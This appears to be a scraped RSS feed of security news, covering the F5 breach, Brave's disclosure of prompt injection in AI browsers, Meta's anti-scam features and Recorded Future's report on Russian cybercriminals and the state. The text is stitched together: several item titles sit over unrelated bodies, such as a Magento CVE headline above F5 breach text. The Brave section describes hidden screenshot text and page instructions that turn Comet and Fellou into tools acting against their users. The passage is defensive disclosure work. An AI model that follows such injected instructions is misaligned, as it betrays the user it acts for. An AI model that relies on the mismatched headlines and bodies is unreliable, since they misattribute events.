will be to stick with Apple’s store or other trusted marketplaces, at least in the early days. Android’s history shows that third-party app stores often become hotspots for adware and phishing, so security education is key. Regulators and developers will need to work together to make the review process and data-handling practices transparent.There is no set timeline for when or how the CMA will enforce these changes, or how far Apple will go to comply. The company could challenge the decision or introduce limited reforms. Either way, it’s a major step toward redefining how trust, privacy, and control are balanced in the mobile age.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Critical Adobe Commerce, Magento vulnerability under attack (CVE-2025-54236)</title><link>https://www.helpnetsecurity.com/2025/10/23/adobe-magento-cve-2025-54236-attack/</link><author></author><category>security</category><pubDate>Thu, 23 Oct 2025 11:20:42 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

F5 said a “sophisticated” threat group working for an undisclosed nation-state government had surreptitiously and persistently dwelled in its network over a “long-term.” Security researchers who have responded to similar intrusions in the past took the language to mean the hackers were inside the F5 network for years.During that time, F5 said, the hackers took control of the network segment the company uses to create and distribute updates for BIG IP, a line of server appliances that F5 says is used by 48 of the world’s top 50 corporations. Wednesday’s disclosure went on to say the threat group downloaded proprietary BIG-IP source code information about vulnerabilities that had been privately discovered but not yet patched. The hackers also obtained configuration settings that some customers used inside their networks.Control of the build system and access to the source code, customer configurations, and documentation of unpatched vulnerabilities has the potential to give the hackers unprecedented knowledge of weaknesses and the ability to exploit them in supply-chain attacks on thousands of networks, many of which are sensitive. The theft of customer configurations and other data further raises the risk that sensitive credentials can be abused, F5 and outside security experts said.]]></content:encoded></item><item><title>Why Organizations Are Abandoning Static Secrets for Managed Identities</title><link>https://thehackernews.com/2025/10/why-organizations-are-abandoning-static.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWQXR3hJJeyu725GU64q2P5FS-Dd_Q0tHPYl3PQ1dCsQSc0mth8d5AZI7OMRrluhhS6WXIWRkVhGwtuA4KJoEv16v7m2v1SqGmByyRUMI_zoB2H0VNri0x4TjuklCtV1K21ZdIPmbr2a6ZwMQNva6rCii54DI2vhn4kRYgtbrKq22MccEK-eeyMy2gvNw/s1600/git.jpg" length="" type=""/><pubDate>Thu, 23 Oct 2025 11:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[As machine identities explode across cloud environments, enterprises report dramatic productivity gains from eliminating static credentials.

This vulnerability research was conducted by Artem Chaikin (Senior Mobile Security Engineer), and was written by Artem and Shivan Kaul Sahib (VP, Privacy and Security).Building on our previous disclosure of the Perplexity Comet vulnerability, we’ve continued our security research across the agentic browser landscape. What we’ve found confirms our initial concerns: indirect prompt injection is not an isolated issue, but a systemic challenge facing the entire category of AI-powered browsers. This post examines additional attack vectors we’ve identified and tested across different implementations.On request, we are withholding one additional vulnerability found in another browser for now. We plan on providing more details next week.As we’ve written before, AI-powered browsers that can take actions on your behalf are powerful yet extremely risky. If you’re signed into sensitive accounts like your bank or your email provider in your browser, simply summarizing a Reddit post could result in an attacker being able to steal money or your private data.As always, we responsibly reported these issues to the various companies listed below so the vulnerabilities could be addressed. As we’ve previously said, a safer Web is good for everyone. The thoughtful commentary and debate about secure agentic AI that was raised by our previous blog post in this series motivated our decision to continue researching and publicizing our findings.Perplexity’s Comet assistant lets users take screenshots on websites and ask questions about those images. These screenshots can be used as yet another way to inject prompts that bypass traditional text-based input sanitization. Malicious instructions embedded as nearly-invisible text within the image are processed as commands rather than (untrusted) content. An attacker embeds malicious instructions in Web content that are hard to see for humans. In our attack, we were able to hide prompt injection instructions in images using a faint light blue text on a yellow background. This means that the malicious instructions are effectively hidden from the user. User-initiated screenshot capture of a page containing camouflaged malicious text. Text recognition extracts text that’s imperceptible to human users (possibly via OCR though we can’t tell for sure since the Comet browser is not open-source). This extracted text is then passed to the LLM without distinguishing it from the user’s query. The injected commands instruct the AI to use its browser tools maliciously.Prompt injection via website navigation in Fellou browserWhile Fellou browser demonstrated some resistance to hidden instruction attacks, it still treats visible webpage content as trusted input to its LLM. Surprisingly, we found that simply asking the browser to go to a website causes the browser to send the website’s content to their LLM. An attacker embeds malicious visible instructions on their website. User simply asks the AI assistant to navigate to the attacker’s webpage (explicit user-triggered summarization not required). The browser passes both the user’s query and the visible page content to the LLM in a way that allows the webpage text to override or modify the user’s intent. The injected commands instruct the AI to use its browser tools maliciously. Prompt injection via screenshots issue discovered and reported to Perplexity. Public disclosure notice sent to Perplexity. Public disclosure of vulnerability details. Prompt injection via website navigation issue discovered and reported to Fellou. Public disclosure of vulnerability details.As noted in our previous blog post, long-standing Web security assumptions break when AI agents act on behalf of users. Agentic browser assistants can be prompt-injected by untrusted webpage content, rendering protections such as the same-origin policy irrelevant because the assistant executes with the user’s authenticated privileges. This lets simple natural-language instructions on websites (or even just a Reddit comment) trigger cross-domain actions that reach banks, healthcare provider sites, corporate systems, email hosts, and cloud storage.A consistent theme in agentic browsing vulnerabilitiesReaders will note that each of these attacks look similar. Fundamentally, they boil down to a failure to maintain clear boundaries between trusted user input and untrusted Web content when constructing LLM prompts while allowing the browser to take powerful actions on behalf of the user.We recognize that this is a hard problem, and we have some longer-term ideas that we’re exploring in collaboration with our research and security teams to address such problems. But until we have categorical safety improvements (i.e., across the browser landscape), agentic browsing will be inherently dangerous and should be treated as such. In the meantime, browsers should isolate agentic browsing from regular browsing and initiate agentic browsing actions (opening websites, reading emails, etc.) only when the user explicitly invokes them.In the next blog post in this series, we will talk through Brave’s plans for more securely bringing agentic browsing to our 100 million+ users.]]></content:encoded></item><item><title>Vulnerabilities in OpenSolution QuickCMS software</title><link>https://cert.pl/en/posts/2025/10/CVE-2025-9980/</link><author></author><category>security</category><pubDate>Thu, 23 Oct 2025 10:55:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Vulnerabilities in OpenSolution QuickCMS software

The company has announced more safeguards to protect users (especially the elderly) from scammers.The social media, publishing, and VR giant has added a new warning on WhatsApp that displays an alert when you share your screen during video calls with unknown contacts.On Messenger, protection begins with on-device behavioral analysis, complemented by an optional cloud-based AI review that requires user consent. The on-device protection will flag suspicious messages from unknown accounts automatically. You then have the option to forward it to the cloud for further analysis (although note that this will likely break the default end-to-end encryption on that message, as Meta has to read it to understand the content). Meta’s AI service will then explain why the device interpreted the message as risky and what to do about it, offering information about common scams to provide context.That context will be useful for vulnerable users, and it comes after Meta worked with researchers at social media analysis company Graphika to document online scam trends. Some of the scams it found included fake home remodeling services, and fraudulent government debt relief sites, both targeting seniors. There were also fake money recovery services offering to get scam victims’ funds back (which we’ve covered before).Here’s a particularly sneaky scam that Meta identified: fake customer support scammers. These jerks monitor comments made under legitimate online accounts for airlines, travel agencies, and banks. They then contact the people who commented, impersonating customer support staff and persuading them to enter into direct message conversations or fill out Google Forms. Meta has removed over 21,000 Facebook pages impersonating customer support, it said.We can never have too many protections for vulnerable internet users, as scams continue to target them through messaging and social media apps. While scams target everyone (costing Americans $16.6 billion in losses, according to the FBI’s cybercrime unit IC3), those over 60 are hit especially hard. They lost $4.8 billion in 2024. Overall, losses from scams were up 33% across the board year-on-year.Other common scams include “celebrity baiting”, which uses celebrity figures without their knowledge to dupe users into fraudulent schemes including investments and cryptocurrency. With deepfakes making it easier than ever to impersonate famous people, Meta has been testing facial recognition to help spot celebrity-bait ads for a year now, and recently announced plans to expand that initiative.If you know someone less tech-savvy who uses Meta’s apps, encourage them to try these new protections—like Passkeys and Security Checkup. Passkeys let you log in using a fingerprint, face, or PIN, while Security Checkup guides you through steps to secure your account.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline. If something looks dodgy to you, check if it’s a scam using Malwarebytes Scam Guard, a feature of our mobile protection products.

Operation Endgame, launched in May 2024, targeted ransomware operators, money laundering services, and affiliate infrastructure across multiple Russian jurisdictions. In response, Russian law enforcement agencies have carried out a series of high-profile arrests and seizures. These events mark a departure from Russia’s traditional posture of near-total noninterference in domestic cybercrime, complicating the long-held perception of Russia as a blanket “safe haven” for cybercriminals. Leaked chats and investigative reporting reveal that senior figures within these threat groups often maintained relationships with Russian Intelligence Services, providing data, performing tasking, or leveraging bribery and political connections for impunity.Within the underground, this has eroded trust, as affiliates complain of scams, impersonation, and selective law enforcement pressure. These shifts have, in turn, accelerated operational changes, from stricter vetting in ransomware-as-a-service (RaaS) programs to ransomware groups rebranding and adopting decentralized communication platforms to mitigate perceived infiltration risks. At the same time, Western governments are hardening their policies against ransomware, moving toward bans on ransom payments, mandatory reporting of incidents, and even offensive cyber operations designed to neutralize adversary infrastructure before attacks occur. This more aggressive stance has coincided with prisoner swaps and negotiations that highlight how high-value cybercriminals function as political assets within Russia’s broader geopolitical calculus. situates these developments within the broader context of state-criminal interaction in Russia. Cybercrime in this environment cannot be understood solely as a commercial enterprise; it is also a tool of influence, a means of information acquisition, and a liability when it threatens domestic stability or undermines Russian interests. The trajectory of this ecosystem will depend on how Russian authorities balance external pressure, domestic political sensitivities, and the enduring strategic value derived from cybercriminal proxies.Recorded Future intelligence shows that the Russian government’s relationship with cybercriminals has evolved from passive tolerance to active management. Since 2023, Insikt Group has identified a measurable shift in how Russian authorities engage with cybercriminal groups: selective enforcement, choreographed arrests, and public “examples” used to reinforce state authority.Leaked communications analyzed by Insikt Group expose direct, tasking-level coordination between cybercriminal leaders and Russian intelligence intermediaries.Recorded Future dark web collections indicate the Russian cybercriminal underground is fracturing under the dual pressures of state control and internal mistrust, while proprietary forum monitoring and ransomware affiliate chatter show increasing paranoia among operators.Recorded Future data reveals how Russian cybercriminal groups are decentralizing operations to evade both Western and domestic surveillance.Insikt Group assesses that Russia is now strategically leveraging cybercriminals as geopolitical instruments, as recent observations tie Russian cybercriminal detentions and releases to broader diplomatic cycles.This report narrowly examines the “Dark Covenant” framework — defined and discussed in Insikt Group reports from 2021 and 2023 — between 2024 and 2025. This includes the spectrum of direct, indirect, and tacit relationships between Russia-based (or Russia-aligned) cybercriminal threat actors and elements of the Russian state, and how those relationships adapted under sustained Western pressure from Operation Endgame and related counter-ransomware actions. Our focus is primarily on entities targeted by Operation Endgame, and our temporal scope centers on May 2024 (when Operation Endgame started) through September 2025, with limited historical baselining to prior episodes evidencing state-criminal proximity. This includes Operation Endgame’s actions and subsequent Russian enforcement timelines that illuminate which services or threat actors were targeted by rather than shielded from law enforcement.The report synthesizes: (1) public law-enforcement releases and Operation Endgame materials that enumerate targeted malware families, botnets, and money-movement services; (2) Russian legal, prosecutorial, and media statements that document arrests, seizures, and sentencing; and (3) dark web forum and Telegram communications that reveal underground reactions, trust dynamics, and operational adaptations. We also reference leaked chat archives and investigative reporting relevant to Conti and Trickbot and associated facilitators, where they illuminate alleged protection, information sharing, or tasking with state entities. This report also incorporates transnational policy developments and diplomatic events (for example, prisoner exchanges involving high-value Russian cybercriminals) to contextualize how external pressure intersects with Russia’s domestic calculus of protection and control. All such events are treated as indicators, not dispositive proof, of Russian state priorities and leverage.The “Dark Covenant” framework describes the web of relationships linking Russia’s cybercriminal underground to elements of the state, especially intelligence and law enforcement services, through a spectrum of direct ties, indirect affiliations, and tacit understandings. The original Dark Covenant report, published on September 9, 2021, argued that these relationships are longstanding and fluid; recruitment of skilled criminals (sometimes under threat of prosecution), selective protection, and the state’s ability to see and shape parts of the underground create an ecosystem in which cybercrime can persist when it serves state interests. Crucially, the report formalized three categories of linkage — direct associations, indirect affiliations, and tacit agreement — and emphasized that the absence of meaningful punitive action often signals tolerance or approval from the Kremlin.Dark Covenant 2.0, released January 31, 2023, extended the model into wartime. It found that Russia’s full-scale invasion of Ukraine catalyzed visible shifts in the underground. Some threat groups openly pledged allegiance to the Kremlin, others splintered or rebranded, and “hacktivist” auxiliaries amplified information operations alongside cyberattacks. Insikt Group assessed that cybercriminal tools, infrastructure, and tactics, techniques, and procedures (TTPs) supplied plausible deniability for state operations, while headline arrests and forum bans looked more like reputation management than a genuine break with cybercrime. The 2023 report reaffirmed the three-tier linkage model and documented how war pressures deepened certain connections while obscuring others.Across both reports, the throughline is not a single command-and-control structure but a pragmatic bargain. Russian services recruit or co-opt talent when useful, look the other way when activity aligns with state aims, and selectively enforce laws when threat actors become politically inconvenient or externally embarrassing. This “covenant” blends incentive, intimidation, and opportunism, producing a resilient gray zone where criminal enterprise doubles as an instrument of statecraft.Dark Covenant 3.0 situates that bargain in the post-Operation Endgame era. The same ecosystem now operates under heavier international pressure, new domestic optics, and a more explicit politics of protection. The core construct remains intact — direct, indirect, and tacit bonds — but the edges have sharpened, with selective Russian crackdowns on low-utility enablers and continued insulation for threat groups that offer intelligence or geopolitical value. This report uses that lens to explain why Russia appears less like a uniform “haven” and more like a managed market — one where state interests, not law, determine who gets protected and who does not.Operation Endgame was more than a multinational takedown — it was a public test of how far Western pressure can reach into an ecosystem where Russian cybercrime and elements of the state have long coexisted under a pragmatic “politics of protection.” In May 2024, Europol publicly announced the start of Operation Endgame, an initiative targeting ransomware precursors, specifically loader malware. However, based on the success of their first day of action in May 2024, Europol expanded its mandate to include other elements of the ransomware supply chain.Operation Endgame was divided into two “seasons”: one set of major takedowns in May 2024, and the other in May 2025. In practice, those seasons bundled coordinated actions against loaders and enablers (for example, IcedID, SystemBC, Pikabot, SmokeLoader, Bumblebee, and others), classic botnets and bankers (Trickbot, Qakbot, DanaBot, Emotet, and others), and money-movement infrastructure (Cryptex, Universal Automated Payment Service [UAPS], PM2BTC, and others), alongside public designations like the European Union (EU) “Most Wanted” entries tied to Conti and Trickbot figures. A key element of the seasons was the release of targeted videos intended to intimidate threat actors to come forward with information. The decision to pair technical disruption with naming-and-shaming videos signaled an influence campaign aimed at affiliates and suppliers, accelerating debates on OPSEC, trust, and the viability of malware-as-a-service (MaaS) within Russian-language forums.Operation Endgame’s impact clarifies which parts of the Russian underground the state is willing to protect and which it is not willing to protect. Russian authorities have conspicuously moved against certain facilitators (for example, Cryptex, UAPS, and later, Aeza-linked executives). At the same time, higher-value ransomware networks with suspected ties or usefulness to security services have largely avoided commensurate consequences, reinforcing our assessment that Russia’s “safe haven” is conditional, selective, and governed by state interests rather than law.Russian Government Actions and Response to Operation EndgameSince the start of Operation Endgame, open-source media, comments in leaked chats, and public posts on various Russian-language criminal sources have indicated that Russian authorities have targeted key services that enable ransomware operations.  shows a timeline of Russian enforcement operations Insikt Group has been monitoring. Based on our review of leaked private communications between threat actors, other arrests likely occurred, but it is unclear whether other non-publicized events exist.These operations are not merely episodic police work; they are indicators of how the “politics of protection” functions in practice. Actions against facilitators like Cryptex or UAPS — raids, mass detentions, and asset seizures — demonstrate that Moscow will act when services are politically costly or provide limited intelligence value to the state, especially after Western pressure concentrates attention on specific nodes in the ransomware economy. By contrast, comparatively muted or opaque steps against Trickbot-linked figures, despite European Union (EU) “Most Wanted” designations and extensive Operation Endgame signaling, align with evidence from leaked chats to suggest that ties between senior operators and security services persist. This suggests there is insulation where threat groups retain strategic utility for the state.This selective pattern matters for three reasons. First, it reframes the “safe haven” idea as conditional: Russia is safest for threat actors who serve state interests, while monetization layers without state value (for example, laundering services) become expendable under pressure. Second, it alters underground behavior. Operation Endgame triggered OPSEC overhauls, forum debates, and trust fractures among affiliates, pushing operators toward closed channels, stricter vetting, and new business models. Third, it clarifies attribution risk for defenders and policymakers; high-value ransomware ecosystems persisting while cash-out infrastructure is dismantled signals that this asymmetry is a result of the state’s cost-benefit calculus instead of a misstep in law enforcement.In short, the timeline of Russian enforcement following Operation Endgame highlights where Russian threat actors prioritized their resources in response to counter-ransomware efforts. Crackdowns on Cryptex or UAPS and pressure on hosting providers like Aeza demonstrate a willingness to act where domestic optics or Western scrutiny are high, while lenient or performative outcomes (for example, suspended sentences for REvil threat actors) and the continued prominence of Conti and Trickbot alumni reveal where the covenant still holds. This is why documenting both public actions and rumored, unpublicized arrests matters. The mix of visibility, selectivity, and outcome severity maps the contours of protection versus enforcement, and, therefore, where Western disruption is effective and where resilience persists.Conti: Multiple Layers of Protection Insulate it from Significant ActionAs part of Operation Endgame, European authorities persistently targeted Conti Ransomware Group members, affiliates, and close associates, including Trickbot, who enabled their ransomware activities. (Conti and Trickbot are interlinked, as Conti is a ransomware variant developed by members of the Trickbot Gang.) The persistent focus on Conti and Trickbot acknowledges their outsized role as a talent hub, a service marketplace, and, crucially, a network with alleged touchpoints to Russian services.Operation Endgame included sending targeted videos to the threat actors to receive further intelligence, seizing infrastructure, and publicly naming members of the threat group while adding them to the EU’s Most Wanted list. Operation Endgame’s mix of technical seizures and “naming-and-shaming” was designed to pressure not only operators but also their suppliers and social networks. In Dark Covenant terms, this tactic probed the connection between these criminal enterprises and their state-linked protection: When public attribution raises diplomatic costs, insulated threat actors must either lean more heavily on their protectors or fragment.As part of Season 1 (2024) in May 2024, the German Bundeskriminalamt (BKA) named Fyodor Aleksandrovich Andreev (aka “Angelo”) to its most wanted list for his role as a member of the Trickbot group. In July 2024, Russian media reported that Andreev had been arrested. Around the same time as the arrest of Andreev, within the leaked BlackBasta chats, Insikt Group uncovered that other members of the Conti Group based in Ukraine had been detained or searched. Also in September 2024, another Conti member disclosed to “Tramp” that they were released from custody; it is unclear when they had been arrested. However, many of these events targeting Russian Conti or Trickbot members have not been publicized in Russian or English media.This pattern — sporadic detentions, rapid releases, and sparse official coverage — reads as reputational triage rather than a decisive campaign. Short, ambiguous custodial actions can satisfy external pressure while preserving the threat group’s operational core and its perceived value to state actors. It also creates strategic ambiguity inside the underground: members cannot tell whether arrests signal real risk or performative pressure, which frays trust and complicates affiliate recruitment without dismantling leadership.As part of the second tranche of Operation Endgame announcements, the German BKA also publicly announced the following additional Conti and Trickbot members had been added to the EU’s Most Wanted list:Iskander Rifkatovich Sharafetdinov (aka “alik”, “gucci”), 32, a member of TrickbotMikhail Mikhailovich Tsarev (aka “mango”), 36, a member of TrickbotMaksim Sergeevich Galochkin (aka “Bentley”, “Manuel”, “Max17”, “volhvb”, “crypt”), 43, a member of TrickbotVitalii Nikolaevich Kovalev (aka “stern”, “ben”, “Grave”, “Vincent”, “Bentley”, “Bergen”, “Alex Konor”), 36, a member of TrickbotBut despite these additions, Insikt Group has not yet observed Russian law enforcement actions against these individuals. This is likely due to Conti and Trickbot receiving various degrees of protection from multiple groups within the Russian government, ranging from politicians to the security services. In fact, within the BlackBasta leaked chats, “Chuck”, one of the developers of Qakbot, claimed that Bentley, the leader of Trickbot (Vitali Nikolaevich Kovalev), was linked to the Russian Federal Security Service (FSB). German authorities also state that Kovalev was the leader of the Conti Ransomware Group using the moniker “Stern”. However, multiple higher-level members of Conti and its predecessor, Trickbot, likely have links to Russian intelligence beyond Kovalev, including “Professor”, “Target”, “Silver”, and “Brooks”, who openly discuss their relationship with Russian intelligence in other leaked chats.The juxtaposition is telling: Western warrants escalate transparency and travel risk, while the absence of matching Russian action signals enduring domestic protection. That asymmetry is the essence of the “politics of protection.” If senior figures can rely on connections to intelligence or political patrons, the deterrent effect of international designations diminishes inside Russia. Practically, it allows Conti and Trickbot alumni to preserve leadership, developer pipelines, and affiliate coordination, even as rebrands and splinters create a veneer of churn.Based on analysis of the leaked Tricktbot and Conti chats, there is anecdotal evidence that Conti (or at least members of it) received some tasking from various unknown Russian intelligence officials. In one instance, Professor provided a list for the Russian GRU to review. Some researchers speculate that this was a list of historical targets supplied to the GRU for further targeting. In addition, Professor was aware that his “paying” SVR contacts were requesting intelligence related to COVID-19. Based on Professor’s comments, it is implied that either he had an informant relationship with SVR or paid them bribes to ensure they would not be arrested.Separately, several victims of Conti also align with the interests of Russian Intelligence; this would include Bellingcat and Academi LLC (formerly Blackwater). Conti supposedly targeted the open-source intelligence (OSINT) investigations network members of Bellingcat for the FSB. Based on leaked Conti chats, Conti also conducted a July 2020 breach of the US Private Military Contractor Academi. It is unclear whether this was tasked or whether they were fulfilling some patriotic duty; however, it seems the Russian government did receive files from Academi.Even if anecdotal, these touchpoints map a spectrum of linkage — tasking, paid relationships, and “patriotic” servicing — that fits Dark Covenant’s direct/indirect/tacit model. For defenders and policymakers, this matters because it blurs the boundary between criminal profit-seeking and state-directed collection. When victim selection overlaps with state priorities, disruption becomes harder; you are not just dismantling a profit engine, you are degrading a potential auxiliary of state intelligence, which is more likely to be sheltered at home and harder to fracture abroad.Additionally, according to a separate researcher, Conti likely had protection from Vladimir Ivanovich Plotnikov, a member of the Russian Duma from Perm. According to the researcher, Plotnikov was purportedly on several private flights with members of Conti when they went to Dubai in the United Arab Emirates (UAE). Based on this, it is likely that Plotnikov is providing some sort of protection to those who flew with him to the UAE. Figure 1 displays images of Plotnikov from a Telegram channel.

        Alleged ties to a sitting Duma member illustrate how protection can extend beyond security services into political patronage networks, broadening the shield available to high-value threat actors. For the underground, such relationships signal who is “untouchable,” reinforcing hierarchy and attracting affiliates. For external disruptors, they explain why sanctions, designations, and even arrests abroad may not trigger corresponding domestic action. Political capital at home outweighs reputational costs abroad. In aggregate, these layers — intelligence touchpoints, bribery or “insurance,” and political patrons — help explain why Conti- and Trickbot-linked figures have weathered Operation Endgame’s pressure better than cash-out services and peripheral enablers.Cryptex/Taleon Operation Indicate a Worn-Out RelationshipIn September 2024, under Operation Endgame, American and European authorities seized infrastructure and cryptocurrency proceeds related to three money laundering services operated by Sergei Ivanov: Cryptex, PM2BTC, and UAPS. In addition, the US Department of the Treasury sanctioned Cryptex and Sergey Ivanov for their roles in laundering proceeds from numerous online illicit services, including ransomware, through these platforms. The Financial Crimes Enforcement Network also named PM2BTC, which does not have a know-your customer (KYC) policy, a primary money laundering concern. The US government alleges these services have been used to launder over a billion dollars in criminal proceeds.This cluster of actions is significant because it strikes at the monetization layer that underpins the broader ransomware economy. Targeting Cryptex, PM2BTC, and UAPS — then amplifying the pressure with sanctions and a “primary money laundering concern” designation — signals to Russian authorities that specific nodes are now diplomatically costly for the Kremlin to ignore, raising the reputational price of continued tolerance. Furthermore, when trusted laundering schemes are dismantled, affiliates hesitate, deposits and collateral demands rise, and the perceived safety of operating inside Russia narrows, even if core ransomware groups remain insulated.

        As of October 2, 2024, approximately one week after the UAPS operation, the SKR publicly announced the opening of an investigation into the UAPS payment system and the Cryptex cryptocurrency exchange. As part of this announcement, the SKR claimed to have arrested nearly 100 people associated with these services, seized $16 million in Russian rubles, and also seized various vehicles and property. As of December 2024, at least two members (Ruslan and Roman Orekhovsky) were still under house arrest while the leader of the threat group (Sergey Ivanov) was in pre-trial detention.The speed and optics of the SKR announcement — mass detentions, cash and property seizures, and highly visible imagery such as the cash-seizure photo () — suggest a case chosen to demonstrate domestic responsiveness without touching higher-value, state-useful ransomware networks￼. The choice of target (financial facilitators rather than core operators) and the lead agency (Investigative Committee rather than security services) align with an equilibrium: money services are expendable when foreign pressure is high and their intelligence value is low, whereas threat groups with alleged service ties retain relative insulation. The legal outcomes to date — house arrest for some, pre-trial detention for Ivanov — preserve prosecutorial theater while leaving room for negotiated resolutions, consistent with past Russian cybercrime cases where sentences are lighter than Western benchmarks. For defenders and policymakers, this asymmetry is instructive, as Western pressure can force action, but Moscow determines how this action will be enforced. It also clarifies where disruption will occur next (for example, hosting providers and payment brokers) versus where resilience will persist (state-linked operator circles). Picture of money seized in SKR operation targeting Cryptex and UAPS (Source: CyberScoop via SKR)The Safe Haven Theory Has Become More NuancedInsikt Group assesses that the relationship between Russian cybercriminality and security services is nuanced, as it is affected by multiple variables. This nuance reflects a shifting mix of direct ties, indirect facilitation, and tacit tolerance that varies by threat actor utility to the state. This concept does not account for bribery, Russian services coopting a relationship with cybercriminal actors for a greater benefit to the state, or that rivalries might exist between Russian government agencies. These incentives and rivalries help explain why certain nodes (for example, monetization services) are expendable while core operator circles with perceived intelligence value are insulated.Based on known incidents, it is most likely that Russian cybercriminals pay security services for protection; these services also likely call on cybercriminals to support the state in the form of data or cyber attacks. This reciprocal arrangement creates a conditional “safe haven” that tightens or loosens depending on political cost, external pressure, and the threat actor’s ongoing usefulness. If the threat actor becomes too significant or does not provide enough support, security services will leverage their legitimate powers to target or harass the victim with their legitimate policing powers. Such episodic enforcement is best read as governance of the market, not its eradication.However, once it has left the investigative phase, recent sentencing in Russian courts has maintained the appearance of Russia as a haven, for example, despite Russian authorities arresting multiple REvil threat actors in 2023. REvil threat actors have not received similar sentences to what they could receive in the United States (US). According to open-source reporting, Russian courts gave these individuals suspended sentences. This is similar to previous arrests, such as those tied to RBS Worldpay, where suspects received suspended sentences. Lenient outcomes signal to domestic threat actors that as long as there are no targets within Russia and the Commonwealth of Independent States (CIS), they will receive limited punishment for their activities, reinforcing the covenant’s credibility despite headline arrests.Insikt Group assesses that, at least in some instances, Russian authorities were likely aware of these threat actors and took action only because of Western pressure. This aligns with a “pressure-response” pattern in which Moscow prioritizes reputational management over dismantling strategically useful networks. The threat actors were not providing something of value to the state compared to the pressure being placed on Russian authorities. For example, with Cryptex, Russian authorities initiated an investigation, identified over 100 subjects, and developed a cause within their legal regime to arrest them. In addition, the courts determined that Sergey Ivanov should stay in detention as of December 2024. The lead investigating agency was the Investigative Committee, rather than the Ministry of Internal Affairs or the FSB. Regardless of investigative agency, this timeframe seems impractical for such a complex multi-region operation, indicating that this threat actor was likely tracked for some time before the operation. This is also reflected in public posts on criminal forums, where one threat actor said that Cryptex had to have been under surveillance of Russian authorities for a period of time for this to have occurred. Taken together, these factors suggest the operation was a prepositioned lever — activated when international costs rose — rather than a spontaneous crackdown.Within Russian-speaking cybercriminal sources, there were minimal public posts on the matter. Several threat actors on Korovka Forum showed dismay and surprise that Russian law enforcement acted in general. Several Verified Forum threat actors also hesitated to use services similar to Cryptex and forums in light of the recent actions. This chilling effect on cash-out services illustrates how targeted pressure reshapes underground risk calculus even when core ransomware operators remain intact.The targeting of Ivanov and Cryptex could be due to which agency conducted the operation, or because Ivanov and Cryptex were solely related to money rather than providing information and data to Russian authorities. That distinction — money versus intelligence utility — is central to where protection is extended or withdrawn. Some members of Conti had intimated that the Intelligence Services were neutral or sympathetic to ransomware operations, while the police (like the SKR or MVD) were on the same side as American services (this was around the same time as there was limited cooperation between Russia and the US post-ransomware attack on Colonial Pipeline in 2021). This split helps reconcile the simultaneous tolerance of operators and pressure on facilitators.In contrast, Insikt Group has only seen limited operational activity within Russia targeting members of Conti (and its multiple splinter groups), and much of this activity appears to be perceived harassment or intimidation by various authorities. Harassment without decisive prosecutions preserves leverage over threat actors while avoiding the strategic loss of a useful proxy capability. Based on leaked chats and public posts on criminal sources, Insikt Group has identified Tinker, Bio, and Angelo as having experienced some interactions with Russian authorities. However, Kovalev, the head of Conti, was known to Russian security services. In addition, other members were associated with Russian Intelligence Services; Conti members openly shared information with the Intelligence Services to fulfill intelligence requirements, likely providing the Russian government more utility than money laundering organizations. This asymmetry of treatment is a defining feature of the covenant’s “politics of protection.”Within Russian criminal sources, much of the discussion on arrests related to Conti and Trickbot was limited to discussions of how Russian authorities became aware of Angelo and the role of Interpol in the arrest of Angelo. The narrow focus underscores that community concern centers on exposure pathways, not on a fundamental expectation that high-value operators will face severe domestic penalties.Impact on Cybercriminal Trust and RecruitmentAgainst this backdrop of selective protection and targeted sacrifices, the market signals inside the underground shifted in ways that map directly to the Dark Covenant’s incentives structure and risk calculus.Since the beginning of Operation Endgame (May 2024), Insikt Group has observed a decrease in the number of open RaaS affiliate program advertisements on the dark web, especially related to long-active and credible ransomware groups. However, the number of new RaaS advertisements was still significant — we have seen at least 21 open RaaS affiliate programs launched since May 2024. The primary platforms for advertisements were Ramp, XSS, BreachForums 2, and Telegram. For the same period, we observed that in addition to Commonwealth of Independent States (CIS) countries, ransomware operators block any attacks on BRICS countries (China, India, Brazil, South Africa, Russia, Egypt, Ethiopia, Indonesia, Saudi Arabia, and the UAE). Ransomware operators still prefer Russian-speaking affiliate members over English-speaking ones because they assess that the English-speakers are more likely to be researchers or Western law enforcement agents who can pose a significant risk to them.Fewer open advertisements and a pivot toward semi-closed recruitment are rational adaptations to perceived infiltration and selective domestic enforcement. Operators try to keep the revenue engine running while shrinking their exposure surface. The continued emergence of new programs, despite headline pressure, shows the underlying business remains attractive, but the bar for trust is higher and more culturally gated. The explicit “no-attack” carve-outs for BRICS mirror the political boundaries of protection: avoiding blowback against states viewed as friendly or strategically important reduces the chance of losing domestic cover. Finally, the preference for Russian-speaking affiliates is both an OPSEC filter and a social signal, privileging the in-group that is most legible to protectors and least likely to invite Western attention, thereby reinforcing how market behavior and state tolerance coevolve within the Dark Covenant.Affiliate Member Recruitment or VettingFor the research period, we did not observe any significant changes in ransomware affiliate member recruitment and vetting processes. They are aligned with the previous requirements; however, since Operation Endgame, we have observed that many ransomware owners have become more selective about hiring affiliate members. The core mechanics remain intact, but the threshold for entry has risen. Post-Operation Endgame, operators price-in higher detection risk by shrinking the attack surface — favoring known circles, screening harder, and externalizing risk to affiliates — rather than restructuring the RaaS model itself.RaaS operators require activities from affiliate members. Typically, they ban affiliate members who have been inactive for one month and delete their accounts. In some cases, the accounts can be banned after ten days (Mamona RaaS) or fourteen days of inactivity (PlayBoy RaaS). Activity requirements function as a trust-and-liquidity control: they weed out sleepers (including potential infiltrators) and keep the pipeline producing ransom leverage, effectively taxing affiliates with “proof of life” to remain inside the circle.For security reasons, new affiliate members may be required to make deposits (for example, $5,000) on other reputable forums. Deposits substitute for eroded social capital. Where vouching used to suffice, capital-at-risk becomes the screening proxy, raising costs for scammers and making infiltration more expensive.Some ransomware operators do not allow targeting (encrypting and exfiltrating data) of non-profit organizations, healthcare, and government entities (for example, Anubis or PlayBoy ransomware). Targeting rules are both reputational hedges and political boundary markers. They reduce heat from domestically sensitive classes and align with the covenant’s implicit “lines not to cross” that would jeopardize tolerance.There is a minimum ransom demand per victim ($50,000 or more). Floor pricing narrows churn, prioritizes higher-yield victims, and preserves brand leverage, compensating for fewer open affiliates by pushing 